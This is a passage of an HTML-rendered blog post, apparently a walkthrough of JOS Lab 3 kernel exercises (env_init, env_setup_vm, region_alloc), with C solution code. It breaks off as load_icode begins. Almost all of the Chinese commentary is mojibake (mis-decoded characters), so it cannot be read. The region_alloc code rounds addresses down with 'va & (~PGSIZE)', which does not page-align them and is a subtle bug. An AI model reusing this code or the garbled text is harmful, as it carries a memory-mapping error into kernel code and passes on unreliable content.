class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// Make &#x27;envs&#x27; point to an array of size &#x27;NENV&#x27; of &#x27;struct Env&#x27;.</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line">envs = boot_alloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Env) * NENV);</span><br><span class="line"><span class="built_in">memset</span>(envs, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> Env) * NENV);</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// Map the &#x27;envs&#x27; array read-only by the user at linear address UENVS</span></span><br><span class="line"><span class="comment">// (ie. perm = PTE_U | PTE_P).</span></span><br><span class="line"><span class="comment">// Permissions:</span></span><br><span class="line"><span class="comment">//    - the new image at UENVS  -- kernel R, user R</span></span><br><span class="line"><span class="comment">//    - envs itself -- kernel RW, user NONE</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line">boot_map_region(kern_pgdir, UENVS, </span><br><span class="line">ROUNDUP(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Env) * NENV, PGSIZE), </span><br><span class="line">PADDR(envs), PTE_U);</span><br></pre></td></tr></table></figure><h3 id="Creating-and-Running-Environments"><a href="#Creating-and-Running-Environments" class="headerlink" title="Creating and Running Environments"></a>Creating and Running Environments</h3><p>æˆ‘ä»¬å°†åœ¨ <code>kern/env.c</code> ä¸­ç¼–å†™è¿è¡Œç”¨æˆ·ç¯å¢ƒæ‰€éœ€çš„ä»£ç ï¼Œå› ä¸ºç›®å‰è¿˜æ²¡æœ‰æ–‡ä»¶ç³»ç»Ÿï¼Œæ‰€ä»¥ç›®å‰ä¸´æ—¶çš„ä¸€ä¸ªåšæ³•æ˜¯å°†ä¸€ä¸ª ELF æ–‡ä»¶ä»¥ raw æ ¼å¼ï¼ˆé“¾æ¥å†…æ ¸æ—¶ä½¿ç”¨ <code>-b binary</code> é€‰é¡¹ï¼‰åµŒå…¥åˆ°å†…æ ¸é•œåƒä¸­ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬èƒ½åœ¨å†…æ ¸ç¬¦å·æ–‡ä»¶ <code>obj/kern/kernel.sym</code> ä¸­è§åˆ°ä¸€äº›å¥‡æ€ªç¬¦å·çš„ç¼˜æ•…ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆå®éªŒä¸€å¼€å§‹ç¬”è€…åç¼–è¯‘å†…æ ¸é•œåƒè§åˆ°å¥‡æ€ªçš„ç¬¦å·çš„ç¼˜æ•…</p><p><img src="https://s2.loli.net/2022/03/16/w3GDsF2iCI1BVkd.png" alt="image.png"></p><p>åœ¨ <code>kern/init.c</code> ä¸­çš„ <code>i386_init()</code> ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¯åŠ¨ç”¨æˆ·è¿›ç¨‹çš„ä»£ç ï¼Œç„¶è€Œè®¾ç½®ç”¨æˆ·è¿›ç¨‹çš„ä»£ç å°šæœªå®Œå·¥ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬æ¥ä¸‹æ¥éœ€è¦å®Œæˆçš„â€”â€”Exercise2ï¼š</p><blockquote><p><strong>Exercise 2.</strong> In the file <code>env.c</code>, finish coding the following functions:</p><ul><li><p><code>env_init()</code></p><p>Initialize all of the <code>Env</code> structures in the <code>envs</code> array and add them to the <code>env_free_list</code>. Also calls <code>env_init_percpu</code>, which configures the segmentation hardware with separate segments for privilege level 0 (kernel) and privilege level 3 (user).</p></li><li><p><code>env_setup_vm()</code></p><p>Allocate a page directory for a new environment and initialize the kernel portion of the new environmentâ€™s address space.</p></li><li><p><code>region_alloc()</code></p><p>Allocates and maps physical memory for an environment</p></li><li><p><code>load_icode()</code></p><p>You will need to parse an ELF binary image, much like the boot loader already does, and load its contents into the user address space of a new environment.</p></li><li><p><code>env_create()</code></p><p>Allocate an environment with <code>env_alloc</code> and call <code>load_icode</code> to load an ELF binary into it.</p></li><li><p><code>env_run()</code></p><p>Start a given environment running in user mode.</p></li></ul><p>As you write these functions, you might find the new cprintf verb <code>%e</code> useful â€“ it prints a description corresponding to an error code. For example,</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r = -E_NO_MEM;</span><br><span class="line">panic(&quot;env_alloc: %e&quot;, r);</span><br></pre></td></tr></table></figure><p>will panic with the message â€œenv_alloc: out of memoryâ€.</p></blockquote><p>åœ¨å¼€å§‹ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆçœ‹å®éªŒè¯´æ˜æä¾›ç»™æˆ‘ä»¬çš„ä¸€ä¸ªå†…æ ¸è¿è¡Œé“¾ï¼š</p><ul><li><code>start</code> (<code>kern/entry.S</code>)</li><li><code>i386_init</code> (<code>kern/init.c</code>)<ul><li><code>cons_init</code></li><li><code>mem_init</code></li><li><code>env_init</code></li><li><code>trap_init</code> (still incomplete at this point)</li><li><code>env_create</code></li><li><code>env_run</code><ul><li><code>env_pop_tf</code></li></ul></li></ul></li></ul><p>ç°åœ¨å¼€å§‹è¡¥å…¨å®éªŒä»£ç ã€‚</p><h4 id="env-init-ï¼šåˆå§‹åŒ–-Env-ç»“æ„ä½“ï¼Œå»ºç«‹-freelist"><a href="#env-init-ï¼šåˆå§‹åŒ–-Env-ç»“æ„ä½“ï¼Œå»ºç«‹-freelist" class="headerlink" title="env_init()ï¼šåˆå§‹åŒ– Env ç»“æ„ä½“ï¼Œå»ºç«‹ freelist"></a>env_init()ï¼šåˆå§‹åŒ– Env ç»“æ„ä½“ï¼Œå»ºç«‹ freelist</h4><p>é¦–å…ˆçœ‹ <code>env_init()</code> å‡½æ•°çš„æ³¨é‡Šï¼Œä¸»è¦æ˜¯å°† envs æ•°ç»„ä¸­æ‰€æœ‰ Env ç»“æ„ä½“é“¾åˆ° <code>env_free_list</code> ä¸Šï¼Œå¹¶ç¡®ä¿ä¸æ•°ç»„ç›¸åŒçš„ä»å‰å‘åçš„è¿æ¥é¡ºåº</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Mark all environments in &#x27;envs&#x27; as free, set their env_ids to 0,</span></span><br><span class="line"><span class="comment">// and insert them into the env_free_list.</span></span><br><span class="line"><span class="comment">// Make sure the environments are in the free list in the same order</span></span><br><span class="line"><span class="comment">// they are in the envs array (i.e., so that the first call to</span></span><br><span class="line"><span class="comment">// env_alloc() returns envs[0]).</span></span><br><span class="line"><span class="comment">//</span></span><br></pre></td></tr></table></figure><p>åå‘éå† envs æ•°ç»„å»ºç«‹å•å‘é“¾è¡¨å³å¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">env_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Set up envs array</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">env_free_list = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">for</span> (i = NENV - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line">envs[i].env_id = <span class="number">0</span>;</span><br><span class="line">envs[i].env_status = ENV_FREE;</span><br><span class="line">envs[i].env_link = env_free_list;</span><br><span class="line">env_free_list = &amp;envs[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Per-CPU part of the initialization</span></span><br><span class="line">env_init_percpu();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="env-setup-vm-ï¼šåˆ†é…è¿›ç¨‹ç¯å¢ƒèµ„æº"><a href="#env-setup-vm-ï¼šåˆ†é…è¿›ç¨‹ç¯å¢ƒèµ„æº" class="headerlink" title="env_setup_vm()ï¼šåˆ†é…è¿›ç¨‹ç¯å¢ƒèµ„æº"></a>env_setup_vm()ï¼šåˆ†é…è¿›ç¨‹ç¯å¢ƒèµ„æº</h4><p>æƒ¯ä¾‹å…ˆçœ‹æ³¨é‡Šï¼Œä¸»è¦æ˜¯è®©æˆ‘ä»¬åˆ†é…ç”¨æˆ·è¿›ç¨‹æ‰€éœ€èµ„æºï¼šå°±ç›®å‰è€Œè¨€åªæ˜¯åˆ†é…ä¸€ä¸ªé¡µç›®å½•è¡¨ï¼Œå¹¶å»ºç«‹å¯¹åº”çš„å†…æ ¸å…¥å£ç‚¹çš„æ˜ å°„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Initialize the kernel virtual memory layout for environment e.</span></span><br><span class="line"><span class="comment">// Allocate a page directory, set e-&gt;env_pgdir accordingly,</span></span><br><span class="line"><span class="comment">// and initialize the kernel portion of the new environment&#x27;s address space.</span></span><br><span class="line"><span class="comment">// Do NOT (yet) map anything into the user portion</span></span><br><span class="line"><span class="comment">// of the environment&#x27;s virtual address space.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Returns 0 on success, &lt; 0 on error.  Errors include:</span></span><br><span class="line"><span class="comment">//-E_NO_MEM if page directory or table could not be allocated.</span></span><br><span class="line"><span class="comment">//</span></span><br></pre></td></tr></table></figure><p>æ‰€æœ‰çš„è¿›ç¨‹å…±äº«åŒä¸€ä»½å†…æ ¸ç©ºé—´ï¼ˆ<code>UTOP</code> å¾€ä¸Šçš„è™šæ‹Ÿç©ºé—´ï¼‰ï¼Œé™¤äº†<code>UVPT</code>â€”â€”æ¯ä¸ªè¿›ç¨‹å„è‡ªåº”å½“æœ‰ä¸€ä»½ç‹¬ç«‹çš„é¡µç›®å½•è¡¨ï¼Œå› æ­¤åœ¨è¯¥å‡½æ•°ä¸­æˆ‘ä»¬éœ€è¦åˆå§‹åŒ–å•ä¸ªè¿›ç¨‹çš„é¡µè¡¨å¯¹å†…æ ¸ç©ºé—´çš„æ˜ å°„ï¼Œå‚ç…§ <code>inc/memlayout.h</code> ä¸­çš„å¸ƒå±€</p><p>åœ¨ JOS ä¸­å…¶å®æ˜¯ç±»ä¼¼äºæ™®é€š OS ä»¥å‰çš„åšæ³•ï¼šæ¯ä¸ªè¿›ç¨‹å…±äº«ä¸€ä»½å®Œæ•´çš„å†…æ ¸åœ°å€ç©ºé—´çš„æ˜ å°„ï¼Œä½†ç¬”è€…è®¤ä¸ºå…¶å®æˆ‘ä»¬åªéœ€è¦æ˜ å°„åªè¯»çš„ pages æ•°ç»„ä¸ envs æ•°ç»„å³å¯ï¼Œ<strong>å†…æ ¸çš„å…¶ä»–åŒºåŸŸç”¨æˆ·æ˜¯æ²¡æœ‰ä»»ä½•è®¿é—®æƒé™çš„ï¼Œé‚£å…¶å®æ²¡å¿…è¦å»ºç«‹æ˜ å°„</strong>ï¼Œç¬”è€…è®¤ä¸ºæ¯”è¾ƒç†æƒ³çš„ä¸€ä¸ªçŠ¶æ€æ˜¯ç±»ä¼¼ KPTI é‚£æ ·çš„â€”â€”ç”¨æˆ·æ€ä¸å†…æ ¸æ€å„è‡ªæœ‰ä¸€å¼ é¡µè¡¨ï¼Œå…¶ä¸­å†…æ ¸æ€é¡µè¡¨å®Œæ•´æ˜ å°„å†…æ ¸ç©ºé—´ï¼Œç”¨æˆ·æ€é¡µè¡¨ä»…æ˜ å°„å†…æ ¸å…¥å£ç‚¹ï¼ŒåŒæ—¶ä¸¤å¼ é¡µè¡¨éƒ½å®Œæ•´æ˜ å°„ç”¨æˆ·ç©ºé—´</p><p>è¿™å¹¶éä¸èƒ½å®ç°ï¼Œä½†æ˜¯<strong>è¿™æˆ–è®¸éœ€è¦å¯¹ JOS æºç è¿›è¡Œç›¸å½“å¤§çš„æ”¹åŠ¨ï¼Œä¸”è¯¥å‡½æ•°é™¤äº†åˆ›å»ºç”¨æˆ·è¿›ç¨‹ä»¥å¤–è¿˜æ‰¿æ‹…äº†åˆ›å»ºå†…æ ¸è¿›ç¨‹çš„ä»»åŠ¡ï¼Œè€Œåè€…æ˜¯éœ€è¦å¯¹å†…æ ¸ç©ºé—´æœ‰è®¿é—®æƒé™çš„</strong>ï¼Œä¸” KPTI ç¡®ä¹ä¼šå¸¦æ¥ä¸€å®šçš„å¼€é”€ï¼ˆä½†æ˜¯å¯ä»¥é˜²æ­¢ç†”æ–­ä¸å¹½çµæ¼æ´çš„æ”»å‡»ï¼Œå¯èƒ½ä½œä¸ºä¸€ä¸ªå®‰å…¨ç ”ç©¶å‘˜ç¬¬ä¸€æƒ³åˆ°çš„å¹¶ä¸æ˜¯æ€§èƒ½è€Œæ˜¯å®‰å…¨æ€§ï¼‰ï¼Œå› æ­¤è¿™é‡Œç¬”è€…è¿˜æ˜¯é€‰æ‹©è€è€å®å®åœ°å®Œæ•´æ‹·è´ä¸€ä»½å†…æ ¸é¡µè¡¨</p><blockquote><p>è¿™é‡Œåˆ«å¿˜äº† page_alloc() åˆ†é…çš„æ˜¯ page ç»“æ„ä½“çš„åœ°å€ï¼Œæˆ‘ä»¬è¿˜éœ€è¦æ‰‹åŠ¨è½¬ä¸ºè™šæ‹Ÿåœ°å€</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">env_setup_vm</span><span class="params">(<span class="keyword">struct</span> Env *e)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">p</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate a page for the page directory</span></span><br><span class="line"><span class="keyword">if</span> (!(p = page_alloc(ALLOC_ZERO)))</span><br><span class="line"><span class="keyword">return</span> -E_NO_MEM;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Now, set e-&gt;env_pgdir and initialize the page directory.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hint:</span></span><br><span class="line"><span class="comment">//    - The VA space of all envs is identical above UTOP</span></span><br><span class="line"><span class="comment">//(except at UVPT, which we&#x27;ve set below).</span></span><br><span class="line"><span class="comment">//See inc/memlayout.h for permissions and layout.</span></span><br><span class="line"><span class="comment">//Can you use kern_pgdir as a template?  Hint: Yes.</span></span><br><span class="line"><span class="comment">//(Make sure you got the permissions right in Lab 2.)</span></span><br><span class="line"><span class="comment">//    - The initial VA below UTOP is empty.</span></span><br><span class="line"><span class="comment">//    - You do not need to make any more calls to page_alloc.</span></span><br><span class="line"><span class="comment">//    - Note: In general, pp_ref is not maintained for</span></span><br><span class="line"><span class="comment">//physical pages mapped only above UTOP, but env_pgdir</span></span><br><span class="line"><span class="comment">//is an exception -- you need to increment env_pgdir&#x27;s</span></span><br><span class="line"><span class="comment">//pp_ref for env_free to work correctly.</span></span><br><span class="line"><span class="comment">//    - The functions in kern/pmap.h are handy.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line">p-&gt;pp_ref++;</span><br><span class="line"></span><br><span class="line"><span class="comment">// copy kernel pgdir</span></span><br><span class="line"><span class="built_in">memcpy</span>(page2kva(p), kern_pgdir, PGSIZE);</span><br><span class="line"></span><br><span class="line">e-&gt;env_pgdir = page2kva(p);</span><br><span class="line"></span><br><span class="line"><span class="comment">// UVPT maps the env&#x27;s own page table read-only.</span></span><br><span class="line"><span class="comment">// Permissions: kernel R, user R</span></span><br><span class="line">e-&gt;env_pgdir[PDX(UVPT)] = PADDR(e-&gt;env_pgdir) | PTE_P | PTE_U;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>è€Œä¸”ä»”ç»†æƒ³æ¥ï¼ŒKPTIå¹¶éæ˜¯åŸºäºå®‰å…¨æ€§çš„æ”¹è¿›ï¼Œ<strong>è€Œæ˜¯å¯¹æ¼æ´ä¸å¾—ä¸åšå‡ºçš„å¦¥å</strong>ï¼Œå†µä¸”è¿™ä¹Ÿå°±åªæ˜¯åšä¸ªå®éªŒè€Œå·²ï¼Œæš‚æ—¶è¿˜æ˜¯ä¸å¤§å¼ æ——é¼“åœ°æ”¹äº†</p></blockquote><h4 id="region-alloc-ï¼šä¸ºè¿›ç¨‹åˆ†é…ç‰©ç†é¡µé¢ï¼Œå»ºç«‹æ˜ å°„"><a href="#region-alloc-ï¼šä¸ºè¿›ç¨‹åˆ†é…ç‰©ç†é¡µé¢ï¼Œå»ºç«‹æ˜ å°„" class="headerlink" title="region_alloc()ï¼šä¸ºè¿›ç¨‹åˆ†é…ç‰©ç†é¡µé¢ï¼Œå»ºç«‹æ˜ å°„"></a>region_alloc()ï¼šä¸ºè¿›ç¨‹åˆ†é…ç‰©ç†é¡µé¢ï¼Œå»ºç«‹æ˜ å°„</h4><p>ä¸»è¦æ˜¯ä¸ºç”¨æˆ·è¿›ç¨‹çš„ va èµ·å§‹å¤„ len é•¿åº¦çš„è™šæ‹Ÿåœ°å€ç©ºé—´åˆ†é…ç‰©ç†é¡µé¢ï¼Œåˆ«å¿˜äº†å¤§å°æŒ‰é¡µé¢ç²’åº¦å¯¹é½ä»¥åŠé¡µè¡¨é¡¹ç”¨æˆ·å¯å†™æƒé™</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Allocate len bytes of physical memory for environment env,</span></span><br><span class="line"><span class="comment">// and map it at virtual address va in the environment&#x27;s address space.</span></span><br><span class="line"><span class="comment">// Does not zero or otherwise initialize the mapped pages in any way.</span></span><br><span class="line"><span class="comment">// Pages should be writable by user and kernel.</span></span><br><span class="line"><span class="comment">// Panic if any allocation attempt fails.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">region_alloc</span><span class="params">(<span class="keyword">struct</span> Env *e, <span class="type">void</span> *va, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="comment">// (But only if you need it for load_icode.)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hint: It is easier to use region_alloc if the caller can pass</span></span><br><span class="line"><span class="comment">//   &#x27;va&#x27; and &#x27;len&#x27; values that are not page-aligned.</span></span><br><span class="line"><span class="comment">//   You should round va down, and round (va + len) up.</span></span><br><span class="line"><span class="comment">//   (Watch out for corner-cases!)</span></span><br><span class="line"><span class="type">size_t</span> start, end;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">new_p</span>;</span></span><br><span class="line"></span><br><span class="line">start = ((<span class="type">size_t</span>)va) &amp; (~PGSIZE);</span><br><span class="line">end = ROUNDUP((<span class="type">size_t</span>)va + len, PGSIZE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (; start &lt; end; start += PGSIZE)</span><br><span class="line">&#123;</span><br><span class="line">new_p = page_alloc(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!new_p)</span><br><span class="line">panic(<span class="string">&quot;Out of memory while allocating region for env!&quot;</span>);</span><br><span class="line">new_p-&gt;pp_ref++;</span><br><span class="line"><span class="keyword">if</span>(page_insert(e-&gt;env_pgdir, new_p, (<span class="type">void</span>*)start, PTE_U | PTE_W))</span><br><span class="line">panic(<span class="string">&quot;OOM while inserting page into page table!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="load-icode-ï¼šè§£æ-ELF-æ–‡ä»¶ï¼Œä½œä¸ºæ–°è¿›ç¨‹è½½å…¥"><a href="#load-icode-ï¼šè§£æ-ELF-æ–‡ä»¶ï¼Œä½œä¸ºæ–°è¿›ç¨‹è½½å…¥" class="headerlink" title="load_icode()ï¼šè§£æ ELF æ–‡ä»¶ï¼Œä½œä¸ºæ–°è¿›ç¨‹è½½å…¥"></a>load_icode()ï¼šè§£æ ELF æ–‡ä»¶ï¼Œä½œä¸ºæ–°è¿›ç¨‹è½½å…¥</h4><p>å…ˆçœ‹æ³¨é‡Šï¼Œè®©æˆ‘ä»¬æ‰‹å†™ä¸€ä¸ª ELF è§£æå™¨ï¼Œä¸ºå„ä¸ªå­˜åœ¨äº ELF ä¸­çš„æ®µåˆ†é…ç©ºé—´ï¼ˆä¾‹å¦‚ bss æ®µåœ¨ ELF ä¸­å°±ä¸å ç©ºé—´ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Set up the initial program binary, stack, and processor flags</span></span><br><span class="line"><span class="comment">// for a user process.</span></span><br><span class="line"><span class="comment">// This function is ONLY called during kernel initialization,</span></span><br><span class="line"><span class="comment">// before running the first user-mode environment.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This function loads all loadable segments from the ELF binary image</span></span><br><span class="line"><span class="comment">// into the environment&#x27;s user memory, starting at the appropriate</span></span><br><span class="line"><span class="comment">// virtual addresses indicated in the ELF program header.</span></span><br><span class="line"><span class="comment">// At the same time it clears to zero any portions of these segments</span></span><br><span class="line"><span class="comment">// that are marked in the program header as being mapped</span></span><br><span class="line"><span class="comment">// but not actually present in the ELF file - i.e., the program&#x27;s bss section.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// All this is very similar to what our boot loader does, except the boot</span></span><br><span class="line"><span class="comment">// loader also needs to read the code from disk.  Take a look at</span></span><br><span class="line"><span class="comment">// boot/main.c to get ideas.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Finally, this function maps one page for the program&#x27;s initial stack.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// load_icode panics if it encounters problems.</span></span><br><span class="line"><span class="comment">//  - How might load_icode fail?  What might be wrong with the given input?</span></span><br><span class="line"><span class="comment">//</span></span><br></pre></td></tr></table></figure><p>ä¸»è¦è¿˜æ˜¯è‹¦åŠ›æ´»ï¼Œè§£æ ELF headerï¼Œé€‰å‡ºå¯è½½å…¥æ®µï¼ˆ<code>ph-&gt;p_type == ELF_PROG_LOAD</code>ï¼‰ï¼Œåˆ†é…å†…å­˜ï¼Œåœ¨é¡µè¡¨ä¸­å»ºç«‹æ˜ å°„ï¼Œä¸è¿‡è¿™é‡Œæç¤ºæˆ‘ä»¬å¯ä»¥æŠ„ä¸€æŠ„ <code>boot/main.c</code> ä¸­çš„è§£ææ–¹æ³•ï¼ˆ<del>é‚£ğŸ‘´å½“ç„¶è¦æŠ„ğŸŒ¶</del>ï¼‰</p><blockquote><p> å…³äº ELF æ ¼å¼ç½‘ä¸Šå¤§æŠŠèµ„æ–™ï¼Œä¸ä¼šçš„å¯ä»¥å‚è§ <a href="https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/#%E4%B8%83%E3%80%81%E5%8F%AF%E6%89%A7%E8%A1%8C-ELF-%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%B5%85%E6%9E%90">https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/#%E4%B8%83%E3%80%81%E5%8F%AF%E6%89%A7%E8%A1%8C-ELF-%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%B5%85%E6%9E%90</a></p></blockquote><p>è¿™é‡Œæˆ‘ä»¬éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äºæˆ‘ä»¬ä»…éœ€è¦åœ¨ç”¨æˆ·ç©ºé—´å»ºç«‹æ˜ å°„ï¼Œè€Œæˆ‘ä»¬åœ¨åˆ†é…å®Œç©ºé—´ä¹‹åè¿˜éœ€è¦å°†æ•°æ®æ‹·è´ä¸Šå»ï¼Œè€ƒè™‘åˆ°ç”¨æˆ·ç©ºé—´é¡µè¡¨ä¸­ä¹Ÿæ˜ å°„äº†å†…æ ¸ç©ºé—´ï¼Œ<strong>æˆ‘ä»¬å¯ä»¥å…ˆåˆ‡æ¢åˆ°ç”¨æˆ·é¡µè¡¨å¤„ç†æ•°æ®ï¼Œå®Œæˆä¹‹åå†åˆ‡æ¢å›å†…æ ¸é¡µè¡¨</strong>ï¼Œåœ¨ JOS ä¸­æä¾›äº†ä¸€ä¸ª <code>lcr3()</code> è®©æˆ‘ä»¬èƒ½ç›´æ¥æ›´æ”¹ cr3 å¯„å­˜å™¨çš„å€¼ï¼ˆè¯¥å¯„å­˜å™¨ä¸­å­˜æ”¾ç€é¡µç›®å½•è¡¨çš„åœ°å€ï¼‰</p><p>åˆ«å¿˜äº†å°† ELF header ä¸­çš„ entry ï¼ˆ<strong>ç¨‹åºå…¥å£ç‚¹</strong>ï¼‰ç»™åˆ° Env ç»“æ„ä½“ä¸­å¯„å­˜å™¨ç»“æ„ä½“çš„ eip</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span 